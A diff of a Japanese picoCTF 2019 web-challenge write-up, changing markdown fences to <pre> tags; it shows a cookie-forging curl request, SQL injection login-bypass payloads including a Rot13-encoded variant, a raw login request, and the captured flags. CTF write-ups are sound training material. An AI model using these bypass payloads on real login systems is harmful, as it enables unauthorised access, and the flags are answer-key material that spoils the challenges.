@@ -53,9 +53,9 @@ Hints : Can cookies help you to get the flag?<br />
 
 <br />
 ### Solution
-```
+<pre>
 curl -k -H 'Cookie: admin=True; time=1400'  https://2019shell1.picoctf.com/problem/32249/flag
-```
+</pre>
 
 
 Flag: `picoCTF{0p3n_t0_adm1n5_cc661e91}`
@@ -76,13 +76,13 @@ Hints : The password is being filtered.
 picoCTF 2018のVaultと同じ問題です。
 
 デバッグを見ようとして、以下を入れたら、Flag取れちゃった。
-```
+<pre>
 username
 ' /*
 
 password
 */ or 3=3 -- &debug=1
-```
+</pre>
 
 Flag: `picoCTF{m0R3_SQL_plz_015815e2}`
 
@@ -103,7 +103,7 @@ Hints : Seems like the password is encrypted.
 ### Solution
 Burpでやったらdebug変数が見えたので、1に変えてみました。
 
-```
+<pre>
 POST /problem/12271/login.php HTTP/1.1
 Host: 2019shell1.picoctf.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
@@ -117,25 +117,27 @@ Referer: https://2019shell1.picoctf.com/problem/12271/login.html
 Upgrade-Insecure-Requests: 1
 
 password=admin&debug=1
-```
+</pre>
 
-```
+<pre>
 password: admin
 SQL query: SELECT * FROM admin where password = 'nqzva'
-```
+</pre>
 
 'nqzva' は、'admin' のRot13ですね。
 
 <br />
-いつものこの子を、
-```
+いつも使うこのパターンを、
+<pre>
 ' or 1=1 --
-```
+</pre>
 
 Rot13して以下のようにします。
-```
+<pre>
 ' be 1=1 --
-```
+</pre>
+
+<br>
 
 Flag: `picoCTF{3v3n_m0r3_SQL_ef7eac2f}`
 
